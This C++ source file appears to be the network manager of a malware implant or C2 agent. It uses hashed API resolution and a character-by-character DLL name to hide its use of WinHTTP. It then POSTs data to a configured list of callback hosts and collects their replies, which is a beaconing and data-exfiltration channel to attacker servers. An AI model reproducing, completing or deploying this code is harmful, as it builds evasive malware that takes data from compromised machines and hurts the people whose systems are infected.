#include "../../includes/core/core.h" 
#include "../../includes/net/net.h"
#include "../../includes/api/api.h"

#define RECV_INITIAL_SIZE (64 * 1024)
#define RECV_MAX_SIZE     (1024 * 1024)




BOOL NetMgr::Init() {
    DEBUG_LOGA("[+] Network Manager init");

    CHAR dll[12];
    dll[0] = 'w';
    dll[1] = 'i';
    dll[2] = 'n';
    dll[3] = 'h';
    dll[4] = 't';
    dll[5] = 't';
    dll[6] = 'p';
    dll[7] = '.';
    dll[8] = 'd';
    dll[9] = 'l';
    dll[10] = 'l';
    dll[11] = '\0';

    this->WinHttp = hollow->Win32.LoadLibraryA(dll);
    if (!this->WinHttp) { return FALSE; }

    this->httpApis = (WINHTTP*)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(WINHTTP));
    if (!this->httpApis) { return FALSE; }

    hollow->Modules.winhttp = this->WinHttp;

    this->recvBuf = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, RECV_INITIAL_SIZE);
    if (!this->recvBuf) { return FALSE; }
    this->recvCap = RECV_INITIAL_SIZE;
    this->recvLen = 0;

    if (this->httpApis) {
        this->httpApis->WinHttpOpen = (decltype(this->httpApis->WinHttpOpen))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpOpen);
        this->httpApis->WinHttpConnect = (decltype(this->httpApis->WinHttpConnect))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpConnect);
        this->httpApis->WinHttpCloseHandle = (decltype(this->httpApis->WinHttpCloseHandle))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpCloseHandle);
        this->httpApis->WinHttpOpenRequest = (decltype(this->httpApis->WinHttpOpenRequest))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpOpenRequest);
        this->httpApis->WinHttpSendRequest = (decltype(this->httpApis->WinHttpSendRequest))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpSendRequest);
        this->httpApis->WinHttpReceiveResponse = (decltype(this->httpApis->WinHttpReceiveResponse))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpReceiveResponse);
        this->httpApis->WinHttpQueryDataAvailable = (decltype(this->httpApis->WinHttpQueryDataAvailable))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpQueryDataAvailable);
        this->httpApis->WinHttpQueryHeaders = (decltype(this->httpApis->WinHttpQueryHeaders))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpQueryHeaders);
        this->httpApis->WinHttpReadData = (decltype(this->httpApis->WinHttpReadData))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpReadData);
        this->httpApis->WinHttpSetOption = (decltype(this->httpApis->WinHttpSetOption))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpSetOption);
        this->httpApis->WinHttpAddRequestHeaders = (decltype(this->httpApis->WinHttpAddRequestHeaders))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpAddRequestHeaders);
        this->httpApis->WinHttpGetIEProxyConfigForCurrentUser = (decltype(this->httpApis->WinHttpGetIEProxyConfigForCurrentUser))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpGetIEProxyConfigForCurrentUser);
        this->httpApis->WinHttpGetProxyForUrl = (decltype(this->httpApis->WinHttpGetProxyForUrl))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpGetProxyForUrl);
        this->httpApis->WinHttpDetectAutoProxyConfigUrl = (decltype(this->httpApis->WinHttpDetectAutoProxyConfigUrl))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpDetectAutoProxyConfigUrl);
        this->httpApis->WinHttpGetDefaultProxyConfiguration = (decltype(this->httpApis->WinHttpGetDefaultProxyConfiguration))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpGetDefaultProxyConfiguration);
        DEBUG_LOGA("[*] Loaded winhttps apis");

    }

    return TRUE;

}



BOOL NetMgr::EnsureRecv(SIZE_T needed) {
    if (needed > RECV_MAX_SIZE)
        return FALSE;

    if (needed <= this->recvCap)
        return TRUE;

    SIZE_T newCap = this->recvCap ? this->recvCap : RECV_INITIAL_SIZE;
    while (newCap < needed) {
        if (newCap > RECV_MAX_SIZE / 2) {
            newCap = RECV_MAX_SIZE;
            break;
        }
        newCap *= 2;
    }

    HLOCAL p = hollow->Win32.LocalReAlloc(this->recvBuf, newCap, LMEM_FIXED | LMEM_ZEROINIT);
    if (!p)
        return FALSE;

    this->recvBuf = (PBYTE)p;
    this->recvCap = newCap;
    return TRUE;
}


BOOL NetMgr::DoPost(PBYTE data, SIZE_T len) {
    this->recvLen = 0;

    for (INT32 i = 0; i < hollow->config->net.TotalCallbacks; i++) {
        HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
        LPCWSTR path = L"/";
        DWORD flags = 0, avail = 0, read = 0;
        SIZE_T total = 0;
        BOOL sent = FALSE;

        DEBUG_LOGW(L"[+] Posting to %s", hollow->config->net.hosts[i].host);

        hSession = this->httpApis->WinHttpOpen(NULL,
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession)
            goto NEXT;

        hConnect = this->httpApis->WinHttpConnect(hSession, hollow->config->net.hosts[i].host, hollow->config->net.hosts[i].port, 0);
        if (!hConnect)
            goto NEXT;

        if (hollow->config->net.TotalURIs > 0)
            path = hollow->config->net.paths[i % hollow->config->net.TotalURIs].Path;
        if (hollow->config->net.hosts[i].isHttps)
            flags = WINHTTP_FLAG_SECURE;

        hRequest = this->httpApis->WinHttpOpenRequest(hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
        if (!hRequest)
            goto NEXT;

        if (!this->httpApis->WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)data, (DWORD)len, (DWORD)len, 0)) {
            DEBUG_LOGA("[!] Failed Sending Request: %lu", (unsigned long)GetLastError());
            goto NEXT;
        }

        if (!this->httpApis->WinHttpReceiveResponse(hRequest, NULL))
            goto NEXT;

        for (;;) {
            if (!this->httpApis->WinHttpQueryDataAvailable(hRequest, &avail))
                goto NEXT;

            if (avail == 0)
                break;

            if (!this->EnsureRecv(total + avail))
                goto NEXT;

            read = 0;
            if (!this->httpApis->WinHttpReadData(hRequest, this->recvBuf + total, avail, &read))
                goto NEXT;

            if (read == 0)
                break;

            total += read;
        }

        this->recvLen = total;
        sent = TRUE;

    NEXT:
        if (hRequest) { this->httpApis->WinHttpCloseHandle(hRequest); }
        if (hConnect) { this->httpApis->WinHttpCloseHandle(hConnect); }
        if (hSession) { this->httpApis->WinHttpCloseHandle(hSession); }

        if (sent)
            return TRUE;
    }

    return FALSE;
}


NetMgr* g_NetMgr = NULL;
